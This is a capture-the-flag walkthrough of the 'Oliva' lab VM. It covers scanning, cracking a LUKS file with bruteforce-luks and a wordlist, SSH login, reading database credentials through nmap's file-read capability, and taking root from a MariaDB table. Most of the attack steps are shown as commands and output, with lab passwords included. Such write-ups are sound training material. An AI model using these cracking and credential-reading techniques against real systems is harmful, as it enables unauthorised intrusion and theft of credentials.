@@ -1,0 +1,458 @@
+			ENUMERATION
+
+			
+---ifconfig---
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/OLIVA LINUX CTF]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 13  bytes 3132 (3.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 60  bytes 6923 (6.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                      
+  
+
+---netdiscover---
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/OLIVA LINUX CTF]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts               
+                                                                               
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960              
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      4     240  Unknown vendor              
+ 10.0.2.2        52:54:00:12:35:00      4     240  Unknown vendor              
+ 10.0.2.3        08:00:27:a6:38:fd      4     240  PCS Systemtechnik GmbH      
+ 10.0.2.49       08:00:27:44:a9:ed      4     240  PCS Systemtechnik GmbH      
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                                                            
+
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/OLIVA LINUX CTF]
+└─# nmap 10.0.2.49 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 16:44 +03
+Nmap scan report for 10.0.2.49
+Host is up (0.00075s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
+|_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-server-header: nginx/1.22.1
+|_http-title: Welcome to nginx!
+MAC Address: 08:00:27:44:A9:ED (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.75 ms 10.0.2.49
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.08 seconds
+                     
+
+
+---I check the website, it doesn't show much---
+
+
+---I run a quick dirb scan---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.49
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat May  4 15:40:50 2024
+URL_BASE: http://10.0.2.49/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.2.49/ ----
++ http://10.0.2.49/index.html (CODE:200|SIZE:615)                                                                    
++ http://10.0.2.49/index.php (CODE:200|SIZE:69)                                                                      
+                                                                                                                     
+-----------------
+END_TIME: Sat May  4 15:40:57 2024
+DOWNLOADED: 4612 - FOUND: 2
+
+
+---I see two new pages and check them out. In index.php we see a link that says 
+"Hi oliva, Here the pass to obtain root: CLICK!" Once we click we download a file that
+says oliva---
+
+
+
+---Let's use strings command to see the inside of it and then figure out what type of file
+is this---
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/OLIVA LINUX CTF]
+└─# strings oliva               
+LUKS
+sha256
+9a391896-2dd5-4f2c-84cf-1ba6e4e0577e
+&tNP,
+{"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offset":"32768","size":"258048","encryption":"aes-xts-plain64","key_size":64},"kdf":{"type":"argon2id","time":4,"memory":492082,"cpus":1,"salt":"42RhasQh9qe+TuRnscdX6uJbczXvEl1rc02NxVJimm4="}}},"tokens":{},"segments":{"0":{"type":"crypt","offset":"16777216","size":"dynamic","iv_tweak":"0","encryption":"aes-xts-plain64","sector_size":512}},"digests":{"0":{"type":"pbkdf2","keyslots":["0"],"segments":["0"],"hash":"sha256","iterations":44703,"salt":"CnINOdjFY/gkeinCFc3P0Wfwx3diyTicikYJ3Yqm0x4=","digest":"IEBmokvGNc+REfDDDa7jUbcHA2kTJoVgjb07GMEnnI4="}},"config":{"json_size":"12288","keyslots_size":"16744448"}}
+SKUL
+sha256
+9a391896-2dd5-4f2c-84cf-1ba6e4e0577e
+9G|oG
+{"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offset":"32768","size":"258048","encryption":"aes-xts-plain64","key_size":64},"kdf":{"type":"argon2id","time":4,"memory":492082,"cpus":1,"salt":"42RhasQh9qe+TuRnscdX6uJbczXvEl1rc02NxVJimm4="}}},"tokens":{},"segments":{"0":{"type":"crypt","offset":"16777216","size":"dynamic","iv_tweak":"0","encryption":"aes-xts-plain64","sector_size":512}},"digests":{"0":{"type":"pbkdf2","keyslots":["0"],"segments":["0"],"hash":"sha256","iterations":44703,"salt":"CnINOdjFY/gkeinCFc3P0Wfwx3diyTicikYJ3Yqm0x4=","digest":"IEBmokvGNc+REfDDDa7jUbcHA2kTJoVgjb07GMEnnI4="}},"config":{"json_size":"12288","keyslots_size":"16744448"}}
+u!'	
+E~%3
+hlU#
+kem-V
+HRF /,
+.
+.
+.
+.
+.
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/OLIVA LINUX CTF]
+└─# file oliva                      
+oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, 
+salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., 
+at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,
+"hash":"sha256"},"area":{"type":"raw","offse
+             
+
+
+---okay, this file is a LUKS encrypted file---
+
+
+
+LUKS: Linux Unified Key Setup is an disk encryption specification method created for Linux. Cracking LUKS
+with hashcat or john can take a really long time and might not work at all especially if LUKS version is 
+2 or higher. In order to crack luks encyrpted files we can use a tool named bruteforce-luks that comes installed 
+within kali. If not, simply run:
+apt get install bruteforce-luks
+
+
+
+
+---After that we give the tool the necessarry parameters and a wordlist and wait for it to crack it. It might 
+take some time---
+
+
+ 
+                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/OLIVA LINUX CTF]
+└─# bruteforce-luks -t 4 -f /home/okina/wordlists/rockyou.txt -v 10 oliva
+Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+
+Tried passwords: 8
+Tried passwords per second: 0.727273
+Last tried password: daniel
+
+Tried passwords: 19
+Tried passwords per second: 0.950000
+Last tried password: 000000
+
+.
+.
+.
+.
+.
+.
+.
+
+
+Tried passwords: 966
+Tried passwords per second: 1.254545
+Last tried password: qwert
+
+Tried passwords: 968
+Tried passwords per second: 1.252264
+Last tried password: 87654321
+
+Password found: bebita
+                          
+
+
+---here we find the password of oliva's file, it's bebita---
+
+
+
+---now that we got the password of the luks file, we can run a specific command to decode the encryptions and 
+see the contents of the file---
+
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/OLIVA LINUX CTF]
+└─# cryptsetup luksOpen oliva openoliva.txt
+Enter passphrase for oliva: 
+
+
+
+---the cracked file goes to the  /dev/mapper folder. This folder is where the device mapper devices are located
+at---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/OLIVA LINUX CTF]
+└─# cd /dev/mapper                            
+                                                                                
+┌──(root㉿kali)-[/dev/mapper]
+└─# ls
+control  olivacracked.txt
+
+
+
+---after this you can remount it to wherever you want to, we can get the contents of the file without mounting 
+though---
+
+
+
+┌──(root㉿kali)-[/dev/mapper]
+└─# strings olivacracked.txt 
+/tmp/letsgo
+#%+"
+lost+found
+mypass.txt
+lost+found
+.mypass.txt.swp
+.
+.
+.
+.
+
+root
+oliva
+mypass.txt
+Yesthatsmypass!
+
+
+
+---here we get the password of the user oliva, let's login via ssh---
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/dev/mapper]
+└─# ssh oliva@10.0.2.49     
+oliva@10.0.2.49's password: 
+Linux oliva 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat May  4 14:40:01 2024 from 10.0.2.15
+oliva@oliva:~$ ls
+user.txt
+oliva@oliva:~$ cat user.txt
+
+---First User Flag---
+
+
+
+---we are in as user oliva and got our first flag---
+
+
+
+---let's look for any permissions or privelege escalation vectors, do some manuel enumeration too---
+
+
+---couldn't find much from manuel enumeration, let's use linpeas to discover any priv escalate vectors---
+
+			
+
+oliva@oliva:/tmp$ bash linpeas.sh
+
+
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
+[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+[+] nmap is available for network discovery & port scanning, you should use it yourself
+
+.
+.
+.
+╔══════════╣ MySQL version
+mysql  Ver 15.1 Distrib 10.11.3-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper
+
+
+═╣ MySQL connection using default root/root ........... No
+═╣ MySQL connection using root/toor ................... No
+═╣ MySQL connection using root/NOPASS ................. No
+
+.
+.
+.
+.
+
+Files with capabilities (limited to 50):
+/usr/bin/nmap cap_dac_read_search=eip
+/usr/bin/ping cap_net_raw=ep
+
+
+
+---We find these files within the linpeas scan, you can also discover those two with /usr/sbin/getcap -r--
+We also see that we can use usr/bin/ping and nmap. On top of that we see there is an sql service running. 
+Let's try running nmap to discover any local files that might be exploitable. I want to scan the webpage
+files to discover any results, there is a mysql running after all, maybe we can get credentials---
+
+
+
+
+oliva@oliva:/usr/bin$ nmap -iL /var/www/html/index.php
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-04 16:31 CEST
+Failed to resolve "Hi".
+Failed to resolve "oliva,".
+Failed to resolve "Here".
+Failed to resolve "the".
+Failed to resolve "pass".
+Failed to resolve "to".
+Failed to resolve "obtain".
+Failed to resolve "root:".
+Failed to resolve "<?php".
+Failed to resolve "$dbname".
+Failed to resolve "=".
+Failed to resolve "'easy';".
+Failed to resolve "$dbuser".
+Failed to resolve "=".
+Failed to resolve "'root';".
+Failed to resolve "$dbpass".
+Failed to resolve "=".
+Failed to resolve "'Savingmypass';".
+Failed to resolve "$dbhost".
+Failed to resolve "=".
+Failed to resolve "'localhost';".
+Failed to resolve "?>".
+Failed to resolve "<a".
+Unable to split netmask from target expression: "href="oliva">CLICK!</a>"
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.38 seconds
+
+
+
+---running nmap on index.php gave us user credentials and the database that is being used---
+
+
+Credentials -> root : Savingmypass
+Database -> easy
+
+
+
+---let's get into mysql---
+
+
+oliva@oliva:/usr/bin$ mysql -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 31
+Server version: 10.11.3-MariaDB-1 Debian 12
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| easy               |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0,001 sec)
+
+MariaDB [(none)]> use easy;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [easy]> show tables;
++----------------+
+| Tables_in_easy |
++----------------+
+| logging        |
++----------------+
+1 row in set (0,001 sec)
+
+MariaDB [easy]> select * from logging;
++--------+------+--------------+
+| id_log | uzer | pazz         |
++--------+------+--------------+
+|      1 | root | OhItwasEasy! |
++--------+------+--------------+
+1 row in set (0,001 sec)
+
+
+
+---here we got the password for root user---
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+MariaDB [easy]> select * from logging;
++--------+------+--------------+
+| id_log | uzer | pazz         |
++--------+------+--------------+
+|      1 | root | OhItwasEasy! |
++--------+------+--------------+
+1 row in set (0,001 sec)
+
+MariaDB [easy]> Ctrl-C -- exit!
+Aborted
+
+
+oliva@oliva:/usr/bin$ su root
+Contraseña: 
+root@oliva:/usr/bin# cd /root
+root@oliva:~# ls
+rutflag.txt
+root@oliva:~# cat rutflag.txt 
+
+---Root User Flag---
+
